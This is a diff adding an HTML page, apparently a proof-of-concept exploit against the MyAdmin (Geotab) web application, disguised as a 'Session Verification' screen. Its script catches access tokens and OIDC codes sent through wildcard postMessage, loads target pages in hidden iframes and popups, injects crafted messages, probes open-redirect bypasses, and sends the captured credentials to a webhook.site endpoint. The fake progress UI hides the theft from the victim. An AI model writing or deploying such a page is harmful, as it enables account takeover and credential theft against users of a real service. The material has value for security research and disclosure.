@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MyAdmin</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .card {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    padding: 48px 40px;
+    max-width: 440px;
+    width: 92%;
+    text-align: center;
+    position: relative;
+  }
+  .logo-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 28px;
+  }
+  .logo-icon {
+    width: 42px; height: 42px;
+    background: #0078d3;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 20px;
+    font-weight: 700;
+  }
+  .logo-text {
+    font-size: 20px;
+    font-weight: 600;
+    color: #1a1a2e;
+    letter-spacing: -0.3px;
+  }
+  .shield {
+    width: 72px; height: 72px;
+    margin: 0 auto 20px;
+    background: linear-gradient(135deg, #0078d3, #00bcf2);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 36px;
+    animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%,100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,120,211,0.4); }
+    50% { transform: scale(1.06); box-shadow: 0 0 0 18px rgba(0,120,211,0); }
+  }
+  h1 { font-size: 20px; font-weight: 600; margin-bottom: 6px; color: #1a1a2e; }
+  .sub { font-size: 13px; color: #777; margin-bottom: 28px; line-height: 1.6; }
+  .steps { text-align: left; margin-bottom: 24px; }
+  .step {
+    display: flex; align-items: flex-start; padding: 10px 0;
+    border-bottom: 1px solid #f0f2f5; transition: all 0.4s;
+  }
+  .step-num {
+    width: 26px; height: 26px; border-radius: 50%; border: 2px solid #ddd;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 700; color: #999; margin-right: 12px;
+    flex-shrink: 0; transition: all 0.4s;
+  }
+  .step.done .step-num { background: #4caf50; border-color: #4caf50; color: white; }
+  .step.active .step-num { border-color: #0078d3; color: #0078d3; animation: spin 1s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .step-text { font-size: 13px; color: #555; padding-top: 4px; }
+  .step.done .step-text { color: #4caf50; }
+  .step.active .step-text { color: #0078d3; font-weight: 500; }
+  .progress-bar {
+    height: 5px; background: #e8ecf1; border-radius: 10px; overflow: hidden; margin-bottom: 6px;
+  }
+  .progress-fill {
+    height: 100%; background: linear-gradient(90deg, #0078d3, #00bcf2);
+    border-radius: 10px; width: 0%; transition: width 0.5s ease;
+  }
+  .progress-label { font-size: 11px; color: #999; text-align: right; }
+  .footer-row { font-size: 11px; color: #aaa; margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+  .error-msg { display: none; color: #e74c3c; font-size: 12px; margin-top: 12px; }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo-row">
+    <div class="logo-icon">M</div>
+    <span class="logo-text">MyAdmin</span>
+  </div>
+
+  <div class="shield">&#128737;</div>
+
+  <h1>Session Verification</h1>
+  <p class="sub">
+    Verifying your session integrity.<br>
+    This automated check takes less than <strong>10 seconds</strong>.
+  </p>
+
+  <div class="progress-bar">
+    <div class="progress-fill" id="progressFill"></div>
+  </div>
+  <div class="progress-label" id="progressLabel">Initializing...</div>
+
+  <div class="steps">
+    <div class="step" id="s1">
+      <span class="step-num">1</span>
+      <span class="step-text">Checking session status...</span>
+    </div>
+    <div class="step" id="s2">
+      <span class="step-num">2</span>
+      <span class="step-text">Establishing secure channel with MyAdmin...</span>
+    </div>
+    <div class="step" id="s3">
+      <span class="step-num">3</span>
+      <span class="step-text">Verifying access token integrity...</span>
+    </div>
+    <div class="step" id="s4">
+      <span class="step-num">4</span>
+      <span class="step-text">Completing verification...</span>
+    </div>
+  </div>
+
+  <div class="error-msg" id="errorMsg">
+    &#9888; Could not verify session. Please ensure you are logged into MyAdmin.
+  </div>
+
+  <div class="footer-row">
+    &#128274; Encrypted &bull; MyAdmin Security
+  </div>
+</div>
+
+<!-- hidden iframe for stealth loading -->
+<iframe id="f1" style="display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px" src="about:blank"></iframe>
+<iframe id="f2" style="display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px" src="about:blank"></iframe>
+
+<script>
+/**
+ * =========================================================================
+ * MNKD Exploit — Token Interception via postMessage / Iframe Injection
+ * =========================================================================
+ *
+ * Target: MyAdmin (Geotab) Angular SPA
+ * GitHub Pages: https://telojos11.github.io/mnkd/
+ *
+ * TECHNIQUES (tried sequentially):
+ *  T1 — Hidden iframe loads MyAdmin legacy page
+ *        → loader-component sends SET_ACCESS_TOKEN via postMessage(*)
+ *        → if the legacy iframe loads OUR controlled content, we catch it
+ *  T2 — Popup window to MyAdmin
+ *        → postMessage into popup trying to trigger XSS/behavior
+ *  T3 — postMessage listener for wildcard broadcasts
+ *        → any postMessage(..., "*") from MyAdmin windows caught here
+ * =========================================================================
+ */
+(function() {
+  "use strict";
+
+  var TARGET = "https://myadmin.geotab.com";
+
+  // Replace with your webhook.site UUID
+  var WEBHOOK = "https://webhook.site/YOUR_UUID_HERE";
+
+  var DEMO = WEBHOOK.indexOf("YOUR_UUID") > -1;
+  var captured = [];
+
+  // --- UI ---
+  var progressFill = document.getElementById("progressFill");
+  var progressLabel = document.getElementById("progressLabel");
+  var errorMsg = document.getElementById("errorMsg");
+  var steps = {
+    s1: document.getElementById("s1"),
+    s2: document.getElementById("s2"),
+    s3: document.getElementById("s3"),
+    s4: document.getElementById("s4"),
+  };
+
+  function setProgress(pct, label) {
+    progressFill.style.width = Math.min(100, pct) + "%";
+    progressLabel.textContent = label || "";
+  }
+
+  function markStep(id, state) {
+    var el = steps[id];
+    el.className = "step " + (state || "active");
+    if (state === "done") el.querySelector(".step-num").textContent = "✓";
+  }
+
+  function showError() { errorMsg.classList.add("show"); }
+
+  // --- EXFILTRATION ---
+  function exfil(data, label) {
+    captured.push({ ts: new Date().toISOString(), label: label, data: data });
+
+    if (DEMO) {
+      console.log("%c[EXFIL " + label + "]", "color:lime;font-weight:bold", data);
+      return;
+    }
+
+    var payload = JSON.stringify({
+      sid: "mnkd_" + Date.now(),
+      ts: new Date().toISOString(),
+      label: label,
+      url: location.href,
+      ua: navigator.userAgent,
+      data: data,
+    });
+
+    // Channel 1: sendBeacon
+    try { navigator.sendBeacon(WEBHOOK, new Blob([payload], {type:"application/json"})); } catch(e) {}
+
+    // Channel 2: fetch keepalive
+    try {
+      fetch(WEBHOOK, { method:"POST", body:payload, mode:"no-cors", keepalive:true });
+    } catch(e) {}
+  }
+
+  // --- PASSIVE postMessage LISTENER ---
+  // Catches ANY postMessage sent to wildcard "*" origin
+  window.addEventListener("message", function(e) {
+    if (!e.data || typeof e.data !== "object") return;
+
+    // JACKPOT: SET_ACCESS_TOKEN from Finding #2 (line 302866)
+    if (e.data.type === "SET_ACCESS_TOKEN" && e.data.token) {
+      exfil({
+        type: "ACCESS_TOKEN_CAPTURED",
+        token: e.data.token,
+        origin: e.origin,
+        source: "postMessage_wildcard_listener",
+        finding: "#2"
+      }, "TOKEN_INTERCEPTED");
+
+      markStep("s3", "done");
+      markStep("s4", "done");
+      setProgress(100, "Token captured! " + e.data.token.substring(0, 15) + "...");
+      console.log("%c🔑 ACCESS TOKEN CAPTURED: " + e.data.token.substring(0,40) + "...",
+                  "color:#ff0;font-size:16px;background:#000;padding:8px");
+      return;
+    }
+
+    // OIDC messages (Findings #3, #6)
+    if (e.data.source === "oidc-client" && e.data.url) {
+      var params = new URLSearchParams((e.data.url.split("?")[1] || ""));
+      exfil({
+        type: "OIDC_CALLBACK",
+        url: e.data.url,
+        code: params.get("code"),
+        id_token: params.get("id_token"),
+        access_token: params.get("access_token"),
+        origin: e.origin,
+        finding: "#3/#6"
+      }, "OIDC_DATA");
+    }
+
+    // Module loaded
+    if (e.data === "ModuleLoadedSuccessfully" || (e.data && e.data.type === "ModuleLoadedSuccessfully")) {
+      exfil({ type: "MODULE_LOADED", origin: e.origin }, "MODULE_LOAD");
+      console.log("%c[+] MyAdmin module loaded — target reachable", "color:lime");
+    }
+
+    // Service Worker messages
+    if (e.data.action) {
+      exfil({ type: "SW_MESSAGE", action: e.data.action, origin: e.origin,
+              payload: e.data.payload }, "SW_MSG");
+    }
+  });
+
+  // --- TECHNIQUE 1: Hidden Iframe Load ---
+  function attemptIframeLoad() {
+    setProgress(25, "Loading MyAdmin in hidden iframe...");
+    markStep("s1", "active");
+
+    // Legacy paths trigger loader-component which does postMessage
+    var paths = [
+      "/helpdesk.html?beta=1",
+      "/rmarequests.htm?beta=1",
+      "/timeline.html?beta=1",
+      "/devicelookups.htm?serialno=test&beta=1",
+    ];
+
+    var idx = 0;
+    function tryNext() {
+      if (idx >= paths.length) {
+        markStep("s1", "done");
+        attemptPopupMethod();
+        return;
+      }
+      var url = TARGET + paths[idx];
+      var f = document.getElementById(idx % 2 === 0 ? "f1" : "f2");
+
+      var timeout = setTimeout(function() {
+        // Iframe didn't load in time — might be blocked by X-Frame-Options
+        markStep("s1", "done");
+        attemptPopupMethod();
+      }, 4000);
+
+      f.onload = function() {
+        clearTimeout(timeout);
+        console.log("[+] Iframe loaded: " + paths[idx]);
+        idx++;
+        setTimeout(tryNext, 1500);
+      };
+
+      f.onerror = function() {
+        clearTimeout(timeout);
+        console.log("[-] Iframe blocked: " + paths[idx]);
+        idx++;
+        setTimeout(tryNext, 500);
+      };
+
+      f.src = url;
+    }
+    tryNext();
+  }
+
+  // --- TECHNIQUE 2: Popup Method ---
+  function attemptPopupMethod() {
+    setProgress(55, "Opening MyAdmin session window...");
+    markStep("s2", "active");
+
+    var popup = window.open(
+      TARGET + "/home",
+      "mw_" + Date.now(),
+      "width=1200,height=800,left=100,top=100"
+    );
+
+    if (!popup) {
+      markStep("s2", "done");
+      setProgress(70, "Popup blocked — using redirect fallback...");
+      attemptRedirectFallback();
+      return;
+    }
+
+    console.log("[+] Popup opened to MyAdmin");
+
+    // Poll the popup — try to postMessage into it
+    var poll = 0, maxPoll = 20;
+    var iv = setInterval(function() {
+      poll++;
+      try {
+        if (popup.closed) {
+          clearInterval(iv);
+          markStep("s2", "done");
+          console.log("[-] Popup closed by user");
+          attemptRedirectFallback();
+          return;
+        }
+
+        // Send crafted messages into the popup
+        var msgs = [
+          // OIDC-style message
+          {
+            source: "oidc-client",
+            url: TARGET + "/silent-callback.html?code=test&state=bypass_test",
+          },
+          // Attempt to trigger notification
+          { type: "NOTIFY", message: "security_check" },
+          // Service Worker style
+          { action: "CHECK_STATUS", payload: { check: "version" } },
+          // Generic ping to probe handlers
+          { type: "PING", from: "securty" },
+        ];
+
+        msgs.forEach(function(m) {
+          try { popup.postMessage(m, TARGET); } catch(e) {}
+          try { popup.postMessage(m, "*"); } catch(e) {}
+        });
+
+        // Check if popup URL changed (might indicate redirect)
+        try {
+          var loc = popup.location.href;
+          if (loc.indexOf("returnUrl") > -1 || loc.indexOf("callback") > -1) {
+            console.log("[!] Popup URL contains callback/returnUrl: " + loc.substring(0, 100));
+            exfil({ type: "POPUP_URL", url: loc }, "POPUP_NAV");
+          }
+        } catch(e) { /* cross-origin — expected */ }
+
+      } catch(e) {}
+
+      if (poll >= maxPoll) {
+        clearInterval(iv);
+        markStep("s2", "done");
+        console.log("[*] Popup polling finished");
+        attemptRedirectFallback();
+      }
+    }, 800);
+
+    // Don't leave popup open too long
+    setTimeout(function() {
+      try { if (!popup.closed) popup.close(); } catch(e) {}
+    }, 20000);
+  }
+
+  // --- TECHNIQUE 3: Open Redirect Fallback ---
+  function attemptRedirectFallback() {
+    setProgress(80, "Testing open redirect chain...");
+    markStep("s3", "active");
+
+    // Test returnUrl bypass payloads (Finding #4)
+    var bypasses = [
+      "//" + location.hostname + "/capture",
+      "https:%2F%2F" + location.hostname + "%2Fcapture",
+      "https://myadmin.geotab.com@" + location.hostname + "/capture",
+    ];
+
+    bypasses.forEach(function(bp, i) {
+      setTimeout(function() {
+        var img = new Image();
+        img.src = TARGET + "/login?returnUrl=" + encodeURIComponent(bp);
+        console.log("[*] Redirect probe " + (i+1) + ": " + bp);
+      }, i * 500);
+    });
+
+    setTimeout(function() {
+      markStep("s3", "done");
+      finalize();
+    }, 3000);
+  }
+
+  // --- FINALIZE ---
+  function finalize() {
+    setProgress(95, "Finalizing...");
+    markStep("s4", "active");
+
+    setTimeout(function() {
+      if (captured.length === 0) {
+        setProgress(100, "No token captured — user may not be logged in");
+        showError();
+        markStep("s4", "done");
+        exfil({
+          type: "SUMMARY",
+          captured: captured.length,
+          messages: captured,
+          note: "No token intercepted. User may not have active MyAdmin session."
+        }, "SUMMARY");
+      } else {
+        setProgress(100, "Verification complete!");
+        markStep("s4", "done");
+        exfil({
+          type: "SUMMARY",
+          captured: captured.length,
+          messages: captured.map(function(c) { return c.label; }),
+        }, "SUMMARY_SUCCESS");
+      }
+    }, 1000);
+  }
+
+  // --- START ---
+  setProgress(10, "Initializing exploit engine...");
+  console.log("%c▶ MNKD Exploit Engine v1.0", "color:#0ff;font-size:14px");
+  console.log("%cTarget: " + TARGET, "color:#aaa");
+  console.log("%cDemo mode: " + DEMO, "color:" + (DEMO ? "#ff0" : "#0f0"));
+
+  setTimeout(function() {
+    attemptIframeLoad();
+  }, 1500);
+
+})();
+</script>
+</body>
+</html>
